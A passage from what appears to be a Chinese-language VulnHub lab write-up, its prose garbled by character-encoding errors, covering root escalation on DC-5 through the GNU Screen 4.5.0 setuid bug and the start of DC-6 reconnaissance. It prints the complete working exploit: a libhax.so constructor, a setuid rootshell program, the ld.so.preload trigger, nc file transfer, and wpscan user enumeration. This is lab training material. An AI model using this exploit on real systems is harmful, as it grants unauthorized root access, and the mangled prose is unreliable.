<p>ä¼¼ä¹æ²¡å•¥å¯ä»¥åˆ©ç”¨ææƒçš„ç‚¹ï¼Œä½†æ˜¯æœ‰ä¸ª</p>
<p><img src="/post/vulnhub/image-20221001224134569.png" alt="image-20221001224134569"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>screen-<span class="number">4.5</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>çœ‹èµ·æ¥æœ‰ç‚¹é™Œç”Ÿï¼Œæˆ‘ä»¬<code>ç™¾åº¦/google</code>å°±è¦åˆ©ç”¨èµ·æ¥äº†</p>
<blockquote>
<p><code>GNU Screen</code>æ˜¯ä¸€æ¬¾ç”±<code>GNU</code>è®¡åˆ’å¼€å‘çš„ç”¨äºå‘½ä»¤è¡Œç»ˆç«¯åˆ‡æ¢çš„è‡ªç”±è½¯ä»¶ã€‚</p>
<p>ç”¨æˆ·å¯ä»¥é€šè¿‡è¯¥è½¯ä»¶åŒæ—¶è¿æ¥å¤šä¸ªæœ¬åœ°æˆ–è¿œç¨‹çš„å‘½ä»¤è¡Œä¼šè¯ï¼Œå¹¶åœ¨å…¶é—´è‡ªç”±åˆ‡æ¢ã€‚</p>
<p><code>GNU Screen</code>å¯ä»¥çœ‹ä½œæ˜¯çª—å£ç®¡ç†å™¨çš„å‘½ä»¤è¡Œç•Œé¢ç‰ˆæœ¬ã€‚</p>
<p>å®ƒæä¾›äº†ç»Ÿä¸€çš„ç®¡ç†å¤šä¸ªä¼šè¯çš„ç•Œé¢å’Œç›¸åº”çš„åŠŸèƒ½ã€‚</p>
</blockquote>
<p>çœ‹æ¥æ˜¯å±äºsuidå½“ä¸­çš„æ¼æ´è„šæœ¬ææƒï¼Œé‚£è„šæœ¬æ€ä¹ˆæ‰¾å‘¢</p>
<h4 id="1ï¼‰searchsploitæ‰¾ææƒè„šæœ¬æ–‡ä»¶"><a href="#1ï¼‰searchsploitæ‰¾ææƒè„šæœ¬æ–‡ä»¶" class="headerlink" title="1ï¼‰searchsploitæ‰¾ææƒè„šæœ¬æ–‡ä»¶"></a>1ï¼‰searchsploitæ‰¾ææƒè„šæœ¬æ–‡ä»¶</h4><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>searchsploit</code>æœç´¢è½¯ä»¶ç›¸å…³æ¼æ´æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„è„šæœ¬ï¼Œè€Œä¸”å®ƒçš„ç‰ˆæœ¬å·ä¹Ÿå†™å‡ºæ¥äº†</p>
<p><img src="/post/vulnhub/image-20221001224602898.png" alt="image-20221001224602898"></p>
<p>å‘ç°æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ª<code>shè„šæœ¬</code>æ–‡ä»¶ï¼Œä¸€ä¸ª<code>txtæ–‡æœ¬</code>çš„ï¼ˆPOCï¼‰</p>
<p>çœ‹åˆ°æœ‰<code>shè„šæœ¬</code>æ–‡ä»¶è·¯å¾„ï¼Œå…ˆæŸ¥çœ‹å…¶å†…å®¹æ˜¯ä»€ä¹ˆï¼Œçœ‹çœ‹èƒ½ä¸èƒ½åˆ©ç”¨</p>
<p><img src="/post/vulnhub/image-20221001224718080.png" alt="image-20221001224718080"></p>
<p>å‘ç°æ˜¯ä¸ª<code>cè¯­è¨€è„šæœ¬</code></p>
<p><img src="/post/vulnhub/image-20221001224923228.png" alt="image-20221001224923228"></p>
<p>çœ‹æ¥æˆ‘ä»¬æ‰¾çš„æ˜¯æ­£ç¡®çš„ï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸‹è¯¥è„šæœ¬æ–‡ä»¶ï¼Œçœ‹çœ‹æ€ä¹ˆåˆ©ç”¨å…¶æ¥ææƒ</p>
<blockquote>
<p>ä»”ç»†çœ‹å…¶å®è¿™é‡Œé¢æœ‰ä¸¤ä¸ªCè¯­è¨€è„šæœ¬</p>
<p>ã€<code>EOF</code>ä¸ºæ–‡ç»“æŸç¬¦å·ã€‘</p>
<p>è€Œä¸”éœ€è¦ä¿å­˜åˆ°ä¸¤ä¸ªcæ–‡ä»¶ä¸­å»<br><code>libhax.c</code><br><code>rootshell.c</code></p>
<p>ç„¶åç”¨gccå‘½ä»¤<br><code>gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</code><br><code>gcc -o /tmp/rootshell /tmp/rootshell.c</code></p>
<p>å¯¹ä¸¤ä¸ªcæ–‡ä»¶è¿›è¡Œç¼–è¯‘ï¼Œä»è€Œç”Ÿæˆ<br><code>libhax.so</code><br><code>rootshell</code></p>
<p>ç„¶ååœ¨æŠŠä¸¤ä¸ªcæ–‡ä»¶å’Œä¸¤ä¸ªç¼–è¯‘åç”Ÿæˆçš„æ–‡ä»¶ä¼ å…¥é¶æœºå</p>
<p>åœ¨é¶æœºshellæŒ¨ä¸ªæ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œä»è€Œæ‹¿åˆ°rootæƒé™</p>
<p><code>echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</code><br><code>cd /etc</code><br><code>umask 000 # because</code><br><code>screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</code><br><code>echo &quot;[+] Triggering...&quot;</code><br><code>screen -ls # screen itself is setuid, so... /tmp/rootshell</code>                            </p>
</blockquote>
<p>ä¸ŠåŠéƒ¨åˆ†</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221002124640256.png" alt="image-20221002124640256"></p>
<p>ä¸‹åŠéƒ¨åˆ†</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221002124701995.png" alt="image-20221002124701995"></p>
<p><strong>&#x3D;&#x3D;&gt;</strong></p>
<p>æˆ‘ä»¬éœ€è¦åœ¨é¶æœºçš„&#x2F;tmpç›®å½•ä¸‹ï¼Œä¼ å…¥</p>
<blockquote>
<p><code>libhax.so</code><br><code>rootshell</code><br><code>flag.sh</code>   &#x2F;&#x2F;å†…å®¹ä¸ºåé¢çš„å‘½ä»¤å†…å®¹</p>
</blockquote>
<p>è¿™ä¸‰ä¸ªæ–‡ä»¶</p>
<p>æˆ‘ä»¬å…ˆåœ¨è‡ªå·±çš„<code>kali</code>æœºä¸ŠæŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶å‡†å¤‡å¥½</p>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å…ˆåˆ°æˆ‘ä»¬<code>kali</code>æœºçš„<code>/tmp</code>ç›®å½•ä¸‹</p>
<p>å…ˆæ‰§è¡Œ</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221002124843966.png" alt="image-20221002124843966"></p>
<p>å†æ‰§è¡Œ</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221002124900295.png" alt="image-20221002124900295"></p>
<p>ã€è™½ç„¶ä¼šæŠ¥é”™ï¼Œä½†æ˜¯æ˜¯æ­£å¸¸çš„ï¼Œä¸å½±å“ç¼–è¯‘åäº§ç”Ÿçš„æ–‡ä»¶çš„æ‰§è¡Œã€‘</p>
<p>æ‰§è¡Œå</p>
<blockquote>
<p><code>libhax.so  rootshell</code><br>è¿™ä¸¤ä¸ªæ–‡ä»¶å°±ç”Ÿæˆäº†</p>
</blockquote>
<p>ç„¶åæˆ‘ä»¬çš„<code>flag.sh</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221002134454968.png" alt="image-20221002134454968"></p>
<h4 id="2ï¼‰ncå‘é¶æœºä¼ å…¥è„šæœ¬ææƒæ–‡ä»¶"><a href="#2ï¼‰ncå‘é¶æœºä¼ å…¥è„šæœ¬ææƒæ–‡ä»¶" class="headerlink" title="2ï¼‰ncå‘é¶æœºä¼ å…¥è„šæœ¬ææƒæ–‡ä»¶"></a>2ï¼‰ncå‘é¶æœºä¼ å…¥è„šæœ¬ææƒæ–‡ä»¶</h4><p><code>å½“ç„¶å¦‚æœä½ ç”¨èšå‰‘è¿æ¥çš„shellçš„è¯ï¼Œç›´æ¥æŠŠæ–‡ä»¶æ‹–è¿›å»å°±è¡Œï¼Œç®€å•ä¸€ç‚¹</code></p>
<p>å¦‚æœç”¨ncçš„è¯å½“ç„¶ä¹Ÿä¸éš¾</p>
<p>å…ˆæ˜¯<code>kali</code>æœºæ§åˆ¶å°ã€ç›®å‰çŠ¶æ€ä¸º<code>/tmp</code>ä¸‹ã€‘</p>
<blockquote>
<p><code>nc -lvp 8888 &lt; libhax.so</code>  &#x2F;&#x2F; &lt; è¡¨ç¤ºä¼ å…¥</p>
</blockquote>
<p><img src="/post/vulnhub/image-20221001233201455.png" alt="image-20221001233201455"></p>
<p>é¶æœº<code>shell</code>ã€å¿…é¡»åœ¨<code>/tmp</code>ç›®å½•ä¸‹æ‰èƒ½æ‰§è¡Œncã€‘</p>
<blockquote>
<p><code>cd /tmp</code><br><code>nc 192.168.133.140 8888 &gt; libhax.so</code>  &#x2F;&#x2F;&gt;è¡¨ç¤ºä¼ å‡ºæ¥æ”¶æ–‡ä»¶,192.168.133.140ä¸ºkaliæœºip</p>
</blockquote>
<p><img src="/post/vulnhub/image-20221001233223666.png" alt="image-20221001233223666"></p>
<p>çœ‹åˆ°ä¼ å…¥æˆåŠŸ</p>
<p><code>rootshell</code>å’Œ<code>flag.sh</code>æ–‡ä»¶ç±»ä¼¼ï¼Œä¸å†å±•ç¤º</p>
<p>æœ€åæˆåŠŸä¼ å…¥</p>
<p><img src="/post/vulnhub/image-20221002132325197.png" alt="image-20221002132325197"></p>
<h4 id="3ï¼‰æ‰§è¡Œè„šæœ¬è¿›è¡Œææƒ"><a href="#3ï¼‰æ‰§è¡Œè„šæœ¬è¿›è¡Œææƒ" class="headerlink" title="3ï¼‰æ‰§è¡Œè„šæœ¬è¿›è¡Œææƒ"></a>3ï¼‰æ‰§è¡Œè„šæœ¬è¿›è¡Œææƒ</h4><hr>
<p>ä¼ å…¥å®Œæˆåï¼Œç»™<code>flag.sh</code>åŠ ä¸Šæ‰§è¡Œæƒé™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x flag.sh</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰§è¡Œå³å¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./flag.sh</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="å‡ºç°æ„å¤–"><a href="#å‡ºç°æ„å¤–" class="headerlink" title="*å‡ºç°æ„å¤–"></a>*<strong>å‡ºç°æ„å¤–</strong></h5><p><img src="/post/vulnhub/image-20221002173352619.png" alt="image-20221002173352619"></p>
<p>ä¸çŸ¥é“æœ‰æ²¡æœ‰æœ‹å‹ä¹Ÿé‡åˆ°è¿™ç§æŠ¥é”™</p>
<p>æœ€åä¸€æ­¥æ‰§è¡Œ<code>rootshell</code>çš„æ—¶å€™ï¼Œå¼¹å‡ºè¿™ä¸ªå‘½ä»¤ï¼Œæˆ‘æœç´¢äº†ä¸€ä¸‹ï¼ŒçŒœæµ‹æ˜¯ä¸æ˜¯cè¯­è¨€è„šæœ¬å†™é”™äº†ï¼Œä½†æ˜¯ä»”ç»†æ£€æŸ¥å¹¶æ²¡æœ‰å‡ºé”™</p>
<p>ç„¶åæˆ‘ä»¬çœ‹äº†çœ‹æˆ‘ä»¬çš„<code>kali</code>å’Œ<code>é¶æœº</code>çš„gccç‰ˆæœ¬</p>
<p>å‘ç°</p>
<blockquote>
<p>kaliæœºæ˜¯ï¼š<code>11.3.0-1</code></p>
<p>é¶æœºæ˜¯ï¼š<code>4.9.2</code></p>
</blockquote>
<p>ä½†æ˜¯ç¼–è¯‘å™¨ä¸åŒå¯¹ç»“æœåº”è¯¥æ²¡ä»€ä¹ˆå¤ªå¤§å½±å“</p>
<p>ä½†æˆ‘è¿˜æ˜¯è¯•è¯•èƒ½ä¸èƒ½åœ¨<code>é¶æœºçš„shell</code>é‡Œæ‰§è¡Œgccï¼Œè¿è¡Œä¸¤ä¸ªcè¯­è¨€è„šæœ¬æ–‡ä»¶ï¼Œå¾—åˆ°<code>rootshell</code>å’Œ<code>libhax.so</code>æ–‡ä»¶</p>
<p>ä½†æ˜¯åˆå‡ºç°</p>
<p><img src="/post/vulnhub/image-20221002210307317.png" alt="image-20221002210307317"></p>
<p>åŸæ¥æ˜¯ç¼ºå°‘ç¯å¢ƒå˜é‡ï¼Œå¯¼è‡´æ— æ³•æ‰§è¡Œ</p>
<h6 id="ç»™cc1é…ç½®ç¯å¢ƒå˜é‡"><a href="#ç»™cc1é…ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="ç»™cc1é…ç½®ç¯å¢ƒå˜é‡"></a>ç»™<code>cc1</code>é…ç½®ç¯å¢ƒå˜é‡</h6><p><img src="/post/vulnhub/image-20221002205950588.png" alt="image-20221002205950588"></p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">locate cc1</span><br><span class="line"></span><br><span class="line"><span class="title class_">PATH</span>=<span class="string">&quot;$PATH&quot;</span><span class="symbol">:/usr/lib/gcc/x86_64-linux-gnu/</span><span class="number">4.9</span>/cc1</span><br><span class="line"></span><br><span class="line">export <span class="title class_">PATH</span></span><br></pre></td></tr></table></figure>



<p>ç„¶åæˆ‘ä»¬ä»ç®€ï¼Œç›´æ¥åœ¨é¶æœº<code>shell</code>æ‰§è¡Œ</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dropshell</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">chown</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">chmod</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br></pre></td></tr></table></figure>



<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; <span class="regexp">/tmp/</span>rootshell.c</span><br><span class="line">#<span class="keyword">include</span> &lt;stdio.h&gt;</span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">void</span>)&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o <span class="regexp">/tmp/</span>rootshell <span class="regexp">/tmp/</span>rootshell.c</span><br><span class="line">rm -f <span class="regexp">/tmp/</span>rootshell.c</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸæ‰§è¡Œ</p>
<p><img src="/post/vulnhub/image-20221002210611503.png" alt="image-20221002210611503"></p>
<h6 id="å…³é”®æ¥äº†ã€æœŸå¾…ã€‘"><a href="#å…³é”®æ¥äº†ã€æœŸå¾…ã€‘" class="headerlink" title="å…³é”®æ¥äº†ã€æœŸå¾…ã€‘"></a>å…³é”®æ¥äº†ã€æœŸå¾…ã€‘</h6><p>æˆ‘ä»¬æ‰§è¡Œæˆ‘ä»¬çš„<code>flag.sh</code>è„šæœ¬ã€è¿™é‡Œæ˜¯é‡å¤çš„<code>flag.sh</code>ï¼Œæ‰€ä»¥åå­—ä¸º<code>flag.sh.1</code>ã€‘</p>
<p><img src="/post/vulnhub/image-20221002211351948.png" alt="image-20221002211351948"></p>
<hr>
<p>ç»ˆäºè§£å†³é—®é¢˜åã€å¡äº†ä¸€å¤©äº†ã€‘</p>
<p>ç»ˆäºæˆåŠŸææƒ</p>
<p><img src="/post/vulnhub/image-20221002211423172.png" alt="image-20221002211423172"></p>
<p>åˆ°<code>/root</code>ç›®å½•ä¸‹</p>
<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="/post/vulnhub/image-20221002211550887.png" alt="image-20221002211550887"></p>
<blockquote>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">888b</span>    <span class="number">888</span> d8b                                                      <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">8888b</span>   <span class="number">888</span> Y8P                                                      <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">88888b</span>  <span class="number">888</span>                                                          <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888Y88b</span> <span class="number">888</span> <span class="number">888</span>  .d8888b .d88b.       <span class="number">888</span>  <span class="number">888</span>  <span class="number">888</span>  .d88b.  <span class="number">888</span>d888 <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888</span> Y88b888 <span class="number">888</span> d88P<span class="string">&quot;   d8P  Y8b      888  888  888 d88&quot;</span><span class="string">&quot;88b 888P&quot;</span>   <span class="number">888</span> .<span class="number">88</span>P <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888</span>  Y88888 <span class="number">888</span> <span class="number">888</span>     <span class="number">88888888</span>      <span class="number">888</span>  <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>     <span class="number">888888</span>K  Y8P Y8P Y8P </span><br><span class="line"><span class="attribute">888</span>   Y8888 <span class="number">888</span> Y88b.   Y8b.          Y88b <span class="number">888</span> d88P Y88..<span class="number">88</span>P <span class="number">888</span>     <span class="number">888</span> <span class="string">&quot;88b  &quot;</span>   <span class="string">&quot;   &quot;</span>  </span><br><span class="line"><span class="attribute">888</span>    Y888 <span class="number">888</span>  <span class="string">&quot;Y8888P &quot;</span>Y8888        <span class="string">&quot;Y8888888P&quot;</span>   <span class="string">&quot;Y88P&quot;</span>  <span class="number">888</span>     <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span>                                                                                                                 </span><br></pre></td></tr></table></figure>


<p><code>Once again, a big thanks to all those who do these little challenges,</code><br><code>and especially all those who give me feedback - again, it&#39;s all greatly</code><br><code>appreciated.  :-)</code></p>
<p><code>I also want to send a big thanks to all those who find the vulnerabilities</code><br><code>and create the exploits that make these challenges possible.</code></p>
<p>ç¿»è¯‘ï¼š                                                                                      </p>
<p>å†æ¬¡éå¸¸æ„Ÿè°¢æ‰€æœ‰å®Œæˆè¿™äº›å°æŒ‘æˆ˜çš„äººï¼Œ<br>å°¤å…¶æ˜¯æ‰€æœ‰ç»™æˆ‘åé¦ˆçš„äººâ€”â€”å†ä¸€æ¬¡ï¼Œè¿™ä¸€åˆ‡éƒ½å¾ˆæ£’<br>èµèµã€‚ :-)</p>
<p>æˆ‘è¿˜è¦éå¸¸æ„Ÿè°¢æ‰€æœ‰å‘ç°æ¼æ´çš„äºº<br>å¹¶åˆ›é€ ä½¿è¿™äº›æŒ‘æˆ˜æˆä¸ºå¯èƒ½çš„æ¼æ´ã€‚</p>
</blockquote>
<p><code>åè¡€äº†ï¼Œæœç„¶æ˜¯ä¸­çº§ï¼Œé¡ºä¾¿æé†’ä¸€ä¸‹å¤§å®¶ï¼Œéå¿…è¦ä¸è¦æ›´æ–°</code></p>
<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸã€åè¡€äº†ã€‘</strong></p>
<hr>
<h1 id="å…­ã€DC-6-ä¸­çº§"><a href="#å…­ã€DC-6-ä¸­çº§" class="headerlink" title="å…­ã€DC-6[ä¸­çº§]"></a>å…­ã€DC-6[ä¸­çº§]</h1><p><strong>only one flag</strong></p>
<h2 id="ä¿¡æ¯æ”¶é›†-5"><a href="#ä¿¡æ¯æ”¶é›†-5" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å…ˆæŠ¬æ‰‹<code>nmap</code>æ‰«æä¸€ä¸‹</p>
<p><img src="/post/vulnhub/image-20221006214334035.png" alt="image-20221006214334035"></p>
<blockquote>
<p>å‘ç°<br><code>22</code>ç«¯å£ï¼šè¿è¡Œç€<code>ssh</code>ã€é»˜è®¤ç«¯å£ã€‘<br><code>80</code>ç«¯å£ï¼šè¿è¡Œç€<code>http</code>ã€é»˜è®¤ç«¯å£ã€‘</p>
</blockquote>
<p>çœ‹æ¥å¯èƒ½æ˜¯éœ€è¦<code>ssh</code>è¿æ¥æ‹¿<code>shell</code></p>
<hr>
<p>è¿™ä¸ªé¶æœºå¥½åƒéœ€è¦é…ç½®<code>hosts</code>æ–‡ä»¶ï¼Œä¸ç„¶é€šè¿‡<code>ip</code>æ˜¯è®¿é—®ä¸äº†ç½‘ç«™çš„</p>
<p><img src="/post/vulnhub/image-20221006215651658.png" alt="image-20221006215651658"></p>
<p>ç„¶åè®¿é—®è¯•è¯•</p>
<p>å¥½äº†ã€ä½†æ˜¯å¥½åƒæœ‰ç‚¹å¡ã€‘</p>
<p>ç•Œé¢å’Œ<code>DC2</code>ä¸€æ ·ã€æ¢¦å›<code>DC2</code>ï¼Œæ“ä½œåº”è¯¥å·®ä¸å¤šã€‘</p>
<p><img src="/post/vulnhub/image-20221006220758221.png" alt="image-20221006220758221"></p>
<hr>
<p>ä¹ æƒ¯çœ‹çœ‹<code>wappalyzer</code></p>
<p><img src="/post/vulnhub/image-20221006221445685.png" alt="image-20221006221445685"></p>
<p>çœ‹åˆ°<code>CMS</code>æ˜¯<code>WordPress 5.1.1</code></p>
<p>æƒ³åˆ°å¯ä»¥åˆ©ç”¨ä¸€ä¸‹è¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´ï¼Œæ‹¿åˆ°ä¸€äº›æ•æ„Ÿä¿¡æ¯</p>
<hr>
<p>æˆ‘ä»¬å†çœ‹çœ‹ç½‘ç«™ä¸Šæœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ä¿¡æ¯</p>
<p><code>about us</code>é‡Œä¼¼ä¹å…¨æ˜¯æ–‡æœ¬å†…å®¹æ²¡å•¥æç¤º</p>
<p>çœ‹åˆ°æœ‰ä¸ª<code>concact us</code>ï¼Œå¯èƒ½æœ‰äº¤äº’åˆ©ç”¨çš„åœ°æ–¹</p>
<p><img src="/post/vulnhub/image-20221006222942930.png" alt="image-20221006222942930"></p>
<p>è™½ç„¶çœ‹èµ·æ¥æ²¡æœ‰ä½†æ˜¯å…¶å®æ˜¯æœ‰çš„</p>
<p>é€šè¿‡<code>concact us</code>é¡µé¢çš„urlï¼Œåœ¨åé¢åŠ ä¸Šç”¨æˆ·çš„åå­—å°±å¯ä»¥</p>
<blockquote>
<p><code>http://xxx/admin</code>  </p>
<p>&#x2F;&#x2F;å½“ç„¶å…¶å®å¹¶ä¸å¤ªé‡è¦ï¼Œä¸è¿‡å¯ä»¥è¯•è¯•çœ‹ï¼Œèƒ½ä¸èƒ½ç•™è¨€xssç„¶åæŒŸæŒç®¡ç†å‘˜è´¦æˆ·ï¼Œä¸è¿‡è¿™å¹¶ä¸æ˜¯å®é™…æƒ…å†µï¼Œæ‰€ä»¥å¯ä»¥è‡ªå·±ç•™è¨€ï¼Œç„¶åç™»å½•çœ‹çœ‹</p>
</blockquote>
<hr>
<h2 id="1-wpscançˆ†ç ´å‡ºç”¨æˆ·åã€dc2é‡Œæè¿‡ã€‘"><a href="#1-wpscançˆ†ç ´å‡ºç”¨æˆ·åã€dc2é‡Œæè¿‡ã€‘" class="headerlink" title="1.wpscançˆ†ç ´å‡ºç”¨æˆ·åã€dc2é‡Œæè¿‡ã€‘"></a>1.wpscançˆ†ç ´å‡ºç”¨æˆ·åã€dc2é‡Œæè¿‡ã€‘</h2><p>çœ‹åˆ°<code>wordpress</code>å…ˆç”¨<code>wpscan</code>æä¸€ä¸‹</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">wpscan <span class="comment">--url wordy -e u</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221006235057457.png" alt="image-20221006235057457"></p>
<p>å¾—åˆ°ç”¨æˆ·å</p>
<blockquote>
<p><code>admin</code><br><code>mark</code><br><code>graham</code><br><code>sarah</code><br><code>jens</code></p>
</blockquote>
<p>æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª<code>user.txt</code></p>
